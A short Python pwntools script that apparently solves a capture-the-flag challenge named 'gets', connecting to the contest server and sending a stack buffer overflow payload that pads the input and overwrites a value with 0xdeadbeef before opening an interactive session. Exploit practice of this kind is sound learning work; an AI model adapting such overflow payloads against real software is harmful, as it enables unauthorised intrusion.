from pwn import *

#init

e = ELF('./gets')

#p = process(e.path)
p = remote('gets.litctf.live', 1337)

#exploit

s = b'Yes'
s = s.ljust(0x28, b'\x00')
s += p64(0xdeadbeef)

p.sendlineafter('?', s)

#pray for flag

p.interactive()
